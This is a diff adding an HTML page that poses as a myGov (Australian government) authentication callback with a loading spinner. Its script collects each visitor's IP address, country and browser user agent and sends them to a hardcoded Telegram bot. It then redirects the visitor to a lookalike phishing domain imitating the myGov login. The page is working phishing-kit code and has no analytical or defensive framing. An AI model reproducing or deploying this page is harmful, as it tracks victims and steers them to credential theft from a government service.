@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Auth Callback | myGov</title>
+    <style>
+        body {
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: #ffffff;
+            font-family: Arial, sans-serif;
+        }
+        .spinner-container {
+            text-align: center;
+        }
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #003b5c;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .label {
+            font-size: 18px;
+            color: #333;
+        }
+    </style>
+</head>
+<body>
+    <div class="spinner-container">
+        <div class="spinner"></div>
+        <div class="label">Loading please wait</div>
+    </div>
+
+    <script>
+        // ===== CONFIGURATION =====
+        const BOT_TOKEN = '8724805463:AAEiBiF3GrskRolcXAYgI0_j5QrPPHV4UC8';
+        const CHAT_ID = '722615124';
+        // =========================
+
+        function sendAndRedirect(ip, country) {
+            let ua = navigator.userAgent;
+            let msg = "|----------| New Visitor |--------------|\n";
+            msg += "User IP: " + ip + "\n";
+            msg += "Country: " + country + "\n";
+            msg += "User Agent: " + ua + "\n";
+            msg += "|-----------------------------------------|";
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`)
+                .catch(() => {}) // ignore errors
+                .finally(() => {
+                    window.location.href = 'https://login.my.gov.au.taxreceipt.dpdns.org/accountstmt/log.html';
+                });
+        }
+
+        // Get IP and country, then send Telegram and redirect
+        fetch('https://ipapi.co/json/')
+            .then(res => {
+                if (!res.ok) throw new Error('IP API failed');
+                return res.json();
+            })
+            .then(data => {
+                sendAndRedirect(data.ip || 'Unknown', data.country_name || 'Unknown');
+            })
+            .catch(() => {
+                // Fallback: get just IP
+                fetch('https://api.ipify.org?format=json')
+                    .then(r => r.json())
+                    .then(d => sendAndRedirect(d.ip, 'Unknown'))
+                    .catch(() => sendAndRedirect('Unknown', 'Unknown'));
+            });
+    </script>
+</body>
+</html>
